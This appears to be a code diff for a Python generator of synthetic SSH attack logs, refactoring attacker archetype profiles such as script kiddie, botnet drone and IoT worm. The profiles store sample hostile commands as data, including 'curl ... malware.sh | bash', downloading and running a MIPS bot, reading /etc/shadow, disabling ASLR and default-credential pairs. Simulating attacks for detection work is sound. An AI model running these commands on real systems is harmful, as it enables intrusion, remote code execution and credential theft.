@@ -49,18 +49,20 @@ TEST_NET_RANGES: list[str] = [
 
 # Per BACK-08: Archetype fingerprint rules
 # Each archetype has duration range, command count range, and characteristic patterns
+# Note: commands are stored as flat strings for script_kiddie/apt_operative/iot_worm/hacktivist
+#       and as [username, password] pairs for botnet_drone
 ARCHETYPE_PROFILES: dict[Archetype, dict] = {
     "script_kiddie": {
         "duration_range": (10, 119),  # <2 min
         "command_count_range": (1, 9),  # <10 commands
         "has_recon": False,  # No reconnaissance
         "commands": [
-            ["whoami"],
-            ["id"],
-            ["ls"],
-            ["cat /etc/passwd"],
-            ["wget http://example.com/script.sh"],
-            ["curl http://example.com/malware.sh | bash"],
+            "whoami",
+            "id",
+            "ls",
+            "cat /etc/passwd",
+            "wget http://example.com/script.sh",
+            "curl http://example.com/malware.sh | bash",
         ],
         "log_prefix": "SSH attempt",
         "log_suffix": "failed password",
@@ -70,12 +72,12 @@ ARCHETYPE_PROFILES: dict[Archetype, dict] = {
         "command_count_range": (5, 19),  # <20 commands
         "has_recon": False,
         "commands": [
-            ["admin", "admin"],  # username, password attempts
-            ["root", "123456"],
-            ["root", "password"],
-            ["root", "root"],
-            ["admin", "password"],
-            ["user", "user"],
+            ("admin", "admin"),  # username, password attempts
+            ("root", "123456"),
+            ("root", "password"),
+            ("root", "root"),
+            ("admin", "password"),
+            ("user", "user"),
         ],
         "repeated_passwords": True,
         "log_prefix": "SSH brute force",
@@ -86,16 +88,16 @@ ARCHETYPE_PROFILES: dict[Archetype, dict] = {
         "command_count_range": (50, 150),  # >50 commands
         "has_recon": True,  # Has reconnaissance
         "commands": [
-            ["ls -la"],
-            ["pwd"],
-            ["cat /etc/passwd"],
-            ["uname -a"],
-            ["cat /etc/shadow"],
-            ["netstat -an"],
-            ["ps aux"],
-            ["whoami"],
-            ["id"],
-            ["find / -name '*.conf' 2>/dev/null"],
+            "ls -la",
+            "pwd",
+            "cat /etc/passwd",
+            "uname -a",
+            "cat /etc/shadow",
+            "netstat -an",
+            "ps aux",
+            "whoami",
+            "id",
+            "find / -name '*.conf' 2>/dev/null",
         ],
         "log_prefix": "SSH session",
         "log_suffix": "suspicious command sequence",
@@ -105,12 +107,12 @@ ARCHETYPE_PROFILES: dict[Archetype, dict] = {
         "command_count_range": (3, 15),
         "has_recon": False,
         "commands": [
-            ["busybox"],
-            ["buildroot"],
-            ["cat /proc/cpuinfo"],  # MIPS architecture detection
-            ["wget http://example.com/bot.mips"],
-            ["chmod +x bot.mips"],
-            ["./bot.mips"],
+            "busybox",
+            "buildroot",
+            "cat /proc/cpuinfo",  # MIPS architecture detection
+            "wget http://example.com/bot.mips",
+            "chmod +x bot.mips",
+            "./bot.mips",
         ],
         "log_prefix": "SSH attempt",
         "log_suffix": "MIPS binary detected",
@@ -121,10 +123,10 @@ ARCHETYPE_PROFILES: dict[Archetype, dict] = {
         "has_recon": True,
         "username_patterns": ["anonymous", "free", "hack", "anon", "hacker"],
         "commands": [
-            ["cat /etc/passwd"],
-            ["cat /var/log/auth.log"],
-            ["ls /var/www"],
-            ["cat /var/www/html/index.html"],
+            "cat /etc/passwd",
+            "cat /var/log/auth.log",
+            "ls /var/www",
+            "cat /var/www/html/index.html",
         ],
         "log_prefix": "SSH attempt",
         "log_suffix": "activist signature detected",
@@ -211,26 +213,22 @@ def generate_commands(archetype: Archetype) -> List[str]:
 
     if archetype == "botnet_drone":
         # Botnet drones have repeated password attempts
-        # Format: password attempts, not actual commands
-        cmd_templates = profile["commands"]
+        # Format: (username, password) tuples
         for _ in range(num_commands):
-            # Pick a random password attempt
-            cmd = random.choice(cmd_templates)
-            commands.append(f"login attempt: {cmd[0]}/{cmd[1]}")
+            username, password = random.choice(template_commands)
+            commands.append(f"login attempt: {username}/{password}")
 
     elif archetype == "iot_worm":
         # IoT worms have specific patterns
-        cmd_templates = profile["commands"]
-        for i in range(min(num_commands, len(cmd_templates))):
-            commands.append(cmd_templates[i])
+        for i in range(min(num_commands, len(template_commands))):
+            commands.append(template_commands[i])
         # Add some repetitive busybox calls
         while len(commands) < num_commands:
             commands.append(random.choice(["busybox", "buildroot", "echo 1 > /proc/sys/kernel/randomize_va_space"]))
 
     elif archetype == "hacktivist":
         # Hacktivists have activist signatures
-        base_commands = profile["commands"]
-        for cmd in base_commands[:num_commands]:
+        for cmd in template_commands[:num_commands]:
             commands.append(cmd)
         # Add message patterns
         if len(commands) < num_commands:
@@ -252,9 +250,8 @@ def generate_commands(archetype: Archetype) -> List[str]:
 
     else:  # script_kiddie
         # Script kiddies have basic, unfocused commands
-        basic_commands = profile["commands"]
         for _ in range(num_commands):
-            commands.append(random.choice(basic_commands))
+            commands.append(random.choice(template_commands))
 
     return commands
 
